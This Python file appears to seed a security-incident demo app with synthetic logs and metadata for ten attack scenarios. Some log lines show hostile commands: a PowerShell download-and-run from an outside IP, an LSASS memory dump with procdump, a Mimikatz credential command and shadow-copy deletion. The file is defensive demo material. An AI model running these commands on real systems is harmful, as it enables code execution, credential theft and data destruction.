"""Demo incident and log catalog for Oz AI demonstration seeding."""

from __future__ import annotations

from app.models.enums import IncidentStatus, InvestigationStatus, Severity

# Each incident includes a primary log plus optional supplemental logs (25 total).


def _lines(*rows: str) -> str:
    return "\n".join(rows) + "\n"


def _powershell_log() -> str:
    return _lines(
        "2026-06-24T08:15:01Z HOST=WS-FIN-042 EVENT=ProcessCreate PROCESS=WINWORD.EXE PID=4892",
        "2026-06-24T08:15:03Z HOST=WS-FIN-042 EVENT=ProcessCreate PARENT=WINWORD.EXE PROCESS=powershell.exe",
        "2026-06-24T08:15:03Z HOST=WS-FIN-042 EVENT=CommandLine CMD=powershell.exe -NoProfile -EncodedCommand",
        "2026-06-24T08:15:04Z HOST=WS-FIN-042 EVENT=NetworkConnect PROCESS=powershell.exe DEST=185.234.72.19:443",
        "2026-06-24T08:15:08Z HOST=WS-FIN-042 EVENT=ScriptBlock TEXT=IEX (New-Object Net.WebClient).DownloadString",
        "2026-06-24T08:15:11Z HOST=WS-FIN-042 EVENT=DefenderAlert SEVERITY=High TECHNIQUE=T1059.001",
        "2026-06-24T08:15:40Z HOST=WS-FIN-042 EVENT=IncidentEscalation SEVERITY=High",
    )


def _powershell_transcript_log() -> str:
    return _lines(
        "PS> $encoded = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGplY3QgAE4AZQB0AC4AV2ViQ2xpZW50KQ=='",
        "PS> IEX (New-Object Net.WebClient).DownloadString('http://185.234.72.19/stage.ps1')",
        "PS> Start-Process -WindowStyle Hidden -FilePath powershell.exe",
    )


def _powershell_defender_log() -> str:
    return _lines(
        "2026-06-24T08:15:10Z SEVERITY=High ALERT=SuspiciousPowerShell BEHAVIOR=EncodedCommand",
        "2026-06-24T08:15:30Z ACTION=Quarantine FILE=C:\\Users\\jsmith\\AppData\\Local\\Temp\\stage.ps1",
    )


def _brute_force_log() -> str:
    return _lines(
        "2026-06-25T02:41:01Z EVENT=4625 RESULT=Failure USER=administrator SOURCE=203.0.113.44",
        "2026-06-25T02:41:02Z EVENT=4625 RESULT=Failure USER=administrator SOURCE=203.0.113.44",
        "2026-06-25T02:41:12Z EVENT=4740 RESULT=Lockout USER=administrator SOURCE=203.0.113.44",
        "2026-06-25T02:41:25Z EVENT=Alert THRESHOLD=150/5min SOURCE=203.0.113.44",
    )


def _brute_force_firewall_log() -> str:
    return _lines(
        "2026-06-25T02:41:14Z EVENT=5152 RESULT=Drop PROTO=TCP SOURCE=203.0.113.44 DEST=10.10.0.10:3389",
        "2026-06-25T02:41:18Z EVENT=5157 RESULT=Block PROTO=TCP SOURCE=203.0.113.44 DEST=10.10.0.10:445",
    )


def _brute_force_auth_log() -> str:
    return _lines(
        "2026-06-25T02:41:05Z AUTH FAIL user=administrator src=203.0.113.44 method=NTLM",
        "2026-06-25T02:41:06Z AUTH FAIL user=svc_backup src=203.0.113.44 method=Kerberos",
    )


def _ransomware_log() -> str:
    return _lines(
        "2026-06-26T05:12:01Z HOST=FS-PROD-01 EVENT=EDRAlert SEVERITY=Critical DETECTION=Ransomware",
        "2026-06-26T05:12:03Z HOST=FS-PROD-01 EVENT=FileModify PATH=report.xlsx EXT=.locked",
        "2026-06-26T05:12:15Z HOST=FS-PROD-01 EVENT=VolumeShadowCopy DELETE RESULT=Success",
        "2026-06-26T05:12:25Z HOST=FS-PROD-01 EVENT=IncidentEscalation SEVERITY=Critical",
    )


def _ransomware_fim_log() -> str:
    return _lines(
        "2026-06-26T05:12:11Z FIM ALERT CHANGE=MassRename COUNT=42 DIRECTORY=\\\\FS-PROD-01\\Finance",
        "2026-06-26T05:12:23Z FIM ALERT CHANGE=MassEncrypt COUNT=128 DIRECTORY=\\\\FS-PROD-01\\Shared",
    )


def _ransomware_edr_log() -> str:
    return _lines(
        "2026-06-26T05:12:05Z PROCESS=encrypt.exe PID=8844 PARENT=explorer.exe BEHAVIOR=FileEncryption",
        "2026-06-26T05:12:18Z PROCESS=vssadmin.exe CMD=delete shadows /all /quiet",
    )


def _credential_dump_log() -> str:
    return _lines(
        "2026-06-23T14:22:01Z HOST=DC01 EVENT=ProcessCreate PROCESS=procdump.exe PID=3310",
        "2026-06-23T14:22:02Z HOST=DC01 EVENT=CommandLine CMD=procdump.exe -accepteula -ma lsass.exe lsass.dmp",
        "2026-06-23T14:22:04Z HOST=DC01 EVENT=DefenderAlert TECHNIQUE=T1003.001 CREDENTIAL_ACCESS=LSASS",
        "2026-06-23T14:22:06Z HOST=DC01 EVENT=FileCreate PATH=C:\\Windows\\Temp\\lsass.dmp SIZE=52428800",
    )


def _credential_dump_mimikatz_log() -> str:
    return _lines(
        "2026-06-23T14:22:08Z HOST=WS-IT-09 EVENT=ScriptBlock TEXT=sekurlsa::logonpasswords",
        "2026-06-23T14:22:09Z HOST=WS-IT-09 EVENT=AMSI_SCAN RESULT=Blocked TOOL=mimikatz",
    )


def _outbound_log() -> str:
    return _lines(
        "2026-06-22T19:05:01Z HOST=WS-SALES-12 EVENT=NetworkConnect PROCESS=svchost.exe DEST=45.33.32.156:4444",
        "2026-06-22T19:05:03Z HOST=WS-SALES-12 EVENT=NetworkConnect BYTES_SENT=1048576 PROTO=TCP",
        "2026-06-22T19:05:05Z HOST=WS-SALES-12 EVENT=FirewallAlert DEST=45.33.32.156 REPUTATION=Malicious",
        "2026-06-22T19:05:08Z HOST=WS-SALES-12 EVENT=Beacon DETECTED INTERVAL=60s",
    )


def _outbound_proxy_log() -> str:
    return _lines(
        "2026-06-22T19:05:02Z PROXY LOG URL=http://45.33.32.156/beacon METHOD=POST BYTES=2048",
        "2026-06-22T19:05:07Z PROXY LOG URL=http://45.33.32.156/stage2 METHOD=GET",
    )


def _dns_tunnel_log() -> str:
    return _lines(
        "2026-06-21T11:30:01Z HOST=WS-DEV-03 EVENT=DNSQuery QUERY=a1b2c3d4.evil-c2.example.com",
        "2026-06-21T11:30:02Z HOST=WS-DEV-03 EVENT=DNSQuery QUERY=f5e6d7c8.evil-c2.example.com",
        "2026-06-21T11:30:15Z HOST=WS-DEV-03 EVENT=DNSAlert SUBDOMAIN_LENGTH=63 ENTROPY=High",
        "2026-06-21T11:30:30Z HOST=WS-DEV-03 EVENT=DNSQuery COUNT=450/5min DEST=8.8.8.8",
    )


def _dns_tunnel_flow_log() -> str:
    return _lines(
        "2026-06-21T11:30:10Z FLOW DNS bytes_out=8192 bytes_in=4096 host=WS-DEV-03",
        "2026-06-21T11:30:20Z FLOW DNS anomaly score=0.94 technique=T1071.004",
    )


def _malware_download_log() -> str:
    return _lines(
        "2026-06-20T16:44:01Z HOST=WS-MKT-07 EVENT=NetworkConnect DEST=cdn-drop.example.net:443",
        "2026-06-20T16:44:03Z HOST=WS-MKT-07 EVENT=FileCreate PATH=C:\\Users\\mkt\\Downloads\\update.exe",
        "2026-06-20T16:44:05Z HOST=WS-MKT-07 EVENT=DefenderAlert HASH=84c82834a5d2 REPUTATION=Malware",
        "2026-06-20T16:44:08Z HOST=WS-MKT-07 EVENT=ProcessCreate PROCESS=update.exe PID=5520",
    )


def _malware_download_proxy_log() -> str:
    return _lines(
        "2026-06-20T16:44:02Z PROXY BLOCKED URL=https://cdn-drop.example.net/update.exe CATEGORY=Malware",
        "2026-06-20T16:44:06Z SANDBOX VERDICT=Malicious FILE=update.exe",
    )


def _lateral_movement_log() -> str:
    return _lines(
        "2026-06-19T03:12:01Z HOST=WS-ENG-21 EVENT=LogonType=3 USER=DOMAIN\\svc_deploy SOURCE=10.20.30.5",
        "2026-06-19T03:12:03Z HOST=FS-ENG-01 EVENT=5140 SHARE=\\\\FS-ENG-01\\C$ USER=svc_deploy",
        "2026-06-19T03:12:05Z HOST=WS-ENG-22 EVENT=ProcessCreate PROCESS=psexec.exe CMD=\\\\WS-ENG-22 cmd",
        "2026-06-19T03:12:08Z HOST=WS-ENG-22 EVENT=Technique=T1021.002 LateralMovement=SMB",
    )


def _lateral_movement_smb_log() -> str:
    return _lines(
        "2026-06-19T03:12:04Z SMB SESSION src=10.20.30.5 dst=FS-ENG-01 share=ADMIN$",
        "2026-06-19T03:12:07Z SMB FILE_WRITE path=\\\\WS-ENG-22\\C$\\Windows\\Temp\\svc.exe",
    )


def _privilege_escalation_log() -> str:
    return _lines(
        "2026-06-18T09:33:01Z HOST=WS-HR-04 EVENT=4672 SPECIAL_PRIVILEGES USER=hr_user",
        "2026-06-18T09:33:03Z HOST=WS-HR-04 EVENT=ProcessCreate PROCESS=whoami.exe CMD=/priv",
        "2026-06-18T09:33:05Z HOST=WS-HR-04 EVENT=TokenElevation PROCESS=cmd.exe RESULT=Success",
        "2026-06-18T09:33:08Z HOST=WS-HR-04 EVENT=Technique=T1548 PRIVILEGE_ESCALATION=UACBypass",
    )


def _privilege_escalation_uac_log() -> str:
    return _lines(
        "2026-06-18T09:33:04Z UAC BYPASS detected via fodhelper.exe registry hijack",
        "2026-06-18T09:33:06Z NEW ADMIN SESSION user=hr_user elevation=High",
    )


def _exfiltration_log() -> str:
    return _lines(
        "2026-06-17T22:01:01Z HOST=WS-FIN-08 EVENT=NetworkConnect DEST=s3.amazonaws.com:443 BYTES_OUT=524288000",
        "2026-06-17T22:01:05Z HOST=WS-FIN-08 EVENT=FileAccess PATH=C:\\Finance\\Q4\\payroll.zip COUNT=1",
        "2026-06-17T22:01:10Z HOST=WS-FIN-08 EVENT=DLPAlert UPLOAD=s3://exfil-bucket-xyz/data.zip SIZE=500MB",
        "2026-06-17T22:01:15Z HOST=WS-FIN-08 EVENT=Technique=T1048 EXFIL=CloudStorage",
    )


def _exfiltration_dlp_log() -> str:
    return _lines(
        "2026-06-17T22:01:08Z DLP POLICY=FinancialData ACTION=Alert FILE=payroll.zip",
        "2026-06-17T22:01:12Z CLOUD UPLOAD bucket=exfil-bucket-xyz region=us-east-1",
    )


def _exfiltration_flow_log() -> str:
    return _lines(
        "2026-06-17T22:01:03Z NETFLOW bytes_out=524288000 duration=120s dest=s3.amazonaws.com",
        "2026-06-17T22:01:14Z ANOMALY outbound_ratio=95th_percentile user=fin_analyst",
    )


def _brute_force_summary_log() -> str:
    return _lines(
        "2026-06-25T02:41:25Z SUMMARY failed_logons=152 unique_users=6 source_ip=203.0.113.44",
        "2026-06-25T02:41:26Z ACTION account_lockout=administrator firewall_block=enabled",
    )


LOG_GENERATORS: dict[str, callable] = {
    "powershell_execution.log": _powershell_log,
    "powershell_transcript_1042.log": _powershell_transcript_log,
    "powershell_defender_alert.log": _powershell_defender_log,
    "failed_login_attempts.log": _brute_force_log,
    "firewall_blocked_185.log": _brute_force_firewall_log,
    "auth_failures_dc01.log": _brute_force_auth_log,
    "brute_force_summary.log": _brute_force_summary_log,
    "ransomware_activity.log": _ransomware_log,
    "fim_encryption_burst.log": _ransomware_fim_log,
    "falcon_ransomware_alert.log": _ransomware_edr_log,
    "credential_dump_lsass.log": _credential_dump_log,
    "mimikatz_scriptblock.log": _credential_dump_mimikatz_log,
    "suspicious_outbound_beacon.log": _outbound_log,
    "proxy_outbound_45.log": _outbound_proxy_log,
    "dns_tunnel_queries.log": _dns_tunnel_log,
    "dns_tunnel_flow.log": _dns_tunnel_flow_log,
    "malware_download_update.log": _malware_download_log,
    "malware_sandbox_verdict.log": _malware_download_proxy_log,
    "lateral_movement_smb.log": _lateral_movement_log,
    "smb_session_admin.log": _lateral_movement_smb_log,
    "privilege_escalation_uac.log": _privilege_escalation_log,
    "uac_bypass_fodhelper.log": _privilege_escalation_uac_log,
    "data_exfiltration_s3.log": _exfiltration_log,
    "dlp_financial_alert.log": _exfiltration_dlp_log,
    "netflow_exfiltration.log": _exfiltration_flow_log,
}

DEMO_INCIDENTS: tuple[dict, ...] = (
    {
        "title": "Suspicious PowerShell Execution",
        "description": "PowerShell launched by WINWORD.EXE with encoded command on finance workstation.",
        "severity": Severity.HIGH,
        "status": IncidentStatus.INVESTIGATING,
        "source": "Microsoft Defender",
        "confidence_score": 0.92,
        "created_offset_hours": 72,
        "investigation_status": InvestigationStatus.RUNNING,
        "investigation_started_offset_hours": 71,
        "run_investigation": True,
        "evidence": (
            {"evidence_type": "Windows Event Log", "filename": "security_events_1042.evtx"},
            {"evidence_type": "PowerShell Transcript", "filename": "powershell_transcript_1042.txt"},
        ),
        "log_filenames": (
            "powershell_execution.log",
            "powershell_transcript_1042.log",
            "powershell_defender_alert.log",
        ),
    },
    {
        "title": "Multiple Failed Login Attempts",
        "description": "More than 150 failed logon attempts from a single external IP within five minutes.",
        "severity": Severity.MEDIUM,
        "status": IncidentStatus.NEW,
        "source": "Windows Security Logs",
        "confidence_score": 0.88,
        "created_offset_hours": 50,
        "investigation_status": InvestigationStatus.PENDING,
        "investigation_started_offset_hours": 49,
        "run_investigation": False,
        "evidence": (
            {"evidence_type": "Authentication Log", "filename": "auth_failures_dc01.log"},
            {"evidence_type": "Firewall Event", "filename": "firewall_blocked_185.log"},
        ),
        "log_filenames": (
            "failed_login_attempts.log",
            "firewall_blocked_185.log",
            "auth_failures_dc01.log",
            "brute_force_summary.log",
        ),
    },
    {
        "title": "Possible Ransomware Activity",
        "description": "Rapid file encryption and shadow copy deletion detected across finance file server.",
        "severity": Severity.CRITICAL,
        "status": IncidentStatus.INVESTIGATING,
        "source": "CrowdStrike Falcon",
        "confidence_score": 0.98,
        "created_offset_hours": 32,
        "investigation_status": InvestigationStatus.RUNNING,
        "investigation_started_offset_hours": 31,
        "run_investigation": True,
        "evidence": (
            {"evidence_type": "EDR Alert", "filename": "falcon_ransomware_alert.json"},
            {"evidence_type": "File Integrity Alert", "filename": "fim_encryption_burst.csv"},
        ),
        "log_filenames": (
            "ransomware_activity.log",
            "fim_encryption_burst.log",
            "falcon_ransomware_alert.log",
        ),
    },
    {
        "title": "Credential Dumping via LSASS",
        "description": "Procdump and Mimikatz-like activity targeting LSASS memory on domain controller.",
        "severity": Severity.HIGH,
        "status": IncidentStatus.INVESTIGATING,
        "source": "Microsoft Defender for Endpoint",
        "confidence_score": 0.95,
        "created_offset_hours": 96,
        "investigation_status": InvestigationStatus.COMPLETED,
        "investigation_started_offset_hours": 95,
        "run_investigation": True,
        "evidence": (
            {"evidence_type": "Process Dump", "filename": "lsass.dmp"},
            {"evidence_type": "AMSI Log", "filename": "amsi_mimikatz_block.log"},
        ),
        "log_filenames": (
            "credential_dump_lsass.log",
            "mimikatz_scriptblock.log",
        ),
    },
    {
        "title": "Suspicious Outbound Connection",
        "description": "Periodic beaconing to known malicious IP with high outbound data volume.",
        "severity": Severity.HIGH,
        "status": IncidentStatus.NEW,
        "source": "Network Firewall",
        "confidence_score": 0.87,
        "created_offset_hours": 120,
        "investigation_status": InvestigationStatus.PENDING,
        "investigation_started_offset_hours": 119,
        "run_investigation": False,
        "evidence": (
            {"evidence_type": "Firewall Log", "filename": "fw_beacon_alert.log"},
            {"evidence_type": "Proxy Log", "filename": "proxy_outbound_45.log"},
        ),
        "log_filenames": (
            "suspicious_outbound_beacon.log",
            "proxy_outbound_45.log",
        ),
    },
    {
        "title": "DNS Tunneling Detected",
        "description": "High-entropy DNS queries to suspicious subdomain with abnormal query rate.",
        "severity": Severity.MEDIUM,
        "status": IncidentStatus.INVESTIGATING,
        "source": "DNS Security Analytics",
        "confidence_score": 0.84,
        "created_offset_hours": 144,
        "investigation_status": InvestigationStatus.RUNNING,
        "investigation_started_offset_hours": 143,
        "run_investigation": False,
        "evidence": (
            {"evidence_type": "DNS Query Log", "filename": "dns_queries_evil.log"},
            {"evidence_type": "Flow Record", "filename": "dns_flow_anomaly.csv"},
        ),
        "log_filenames": (
            "dns_tunnel_queries.log",
            "dns_tunnel_flow.log",
        ),
    },
    {
        "title": "Malware Download from CDN",
        "description": "User downloaded executable from CDN flagged as malware by sandbox analysis.",
        "severity": Severity.HIGH,
        "status": IncidentStatus.NEW,
        "source": "Web Proxy + Sandbox",
        "confidence_score": 0.91,
        "created_offset_hours": 168,
        "investigation_status": InvestigationStatus.PENDING,
        "investigation_started_offset_hours": 167,
        "run_investigation": False,
        "evidence": (
            {"evidence_type": "Sandbox Report", "filename": "sandbox_update_exe.json"},
            {"evidence_type": "Proxy Block Log", "filename": "proxy_malware_block.log"},
        ),
        "log_filenames": (
            "malware_download_update.log",
            "malware_sandbox_verdict.log",
        ),
    },
    {
        "title": "Lateral Movement via SMB",
        "description": "Service account used for remote admin share access and PsExec across engineering hosts.",
        "severity": Severity.CRITICAL,
        "status": IncidentStatus.INVESTIGATING,
        "source": "Windows Security + EDR",
        "confidence_score": 0.93,
        "created_offset_hours": 192,
        "investigation_status": InvestigationStatus.RUNNING,
        "investigation_started_offset_hours": 191,
        "run_investigation": True,
        "evidence": (
            {"evidence_type": "SMB Session Log", "filename": "smb_admin_sessions.log"},
            {"evidence_type": "PsExec Alert", "filename": "psexec_remote_exec.json"},
        ),
        "log_filenames": (
            "lateral_movement_smb.log",
            "smb_session_admin.log",
        ),
    },
    {
        "title": "Privilege Escalation Attempt",
        "description": "UAC bypass via fodhelper registry hijack elevating HR user to admin session.",
        "severity": Severity.HIGH,
        "status": IncidentStatus.INVESTIGATING,
        "source": "Microsoft Defender",
        "confidence_score": 0.89,
        "created_offset_hours": 216,
        "investigation_status": InvestigationStatus.RUNNING,
        "investigation_started_offset_hours": 215,
        "run_investigation": False,
        "evidence": (
            {"evidence_type": "Privilege Audit", "filename": "privilege_audit_hr.log"},
            {"evidence_type": "Registry Change", "filename": "registry_fodhelper.reg"},
        ),
        "log_filenames": (
            "privilege_escalation_uac.log",
            "uac_bypass_fodhelper.log",
        ),
    },
    {
        "title": "Data Exfiltration to Cloud Storage",
        "description": "500MB financial archive uploaded to unknown S3 bucket triggering DLP alert.",
        "severity": Severity.CRITICAL,
        "status": IncidentStatus.INVESTIGATING,
        "source": "DLP + NetFlow",
        "confidence_score": 0.97,
        "created_offset_hours": 240,
        "investigation_status": InvestigationStatus.COMPLETED,
        "investigation_started_offset_hours": 239,
        "run_investigation": True,
        "evidence": (
            {"evidence_type": "DLP Alert", "filename": "dlp_payroll_zip.alert"},
            {"evidence_type": "NetFlow Record", "filename": "netflow_s3_upload.csv"},
        ),
        "log_filenames": (
            "data_exfiltration_s3.log",
            "dlp_financial_alert.log",
            "netflow_exfiltration.log",
        ),
    },
)

EXPECTED_LOG_COUNT = sum(len(spec["log_filenames"]) for spec in DEMO_INCIDENTS)
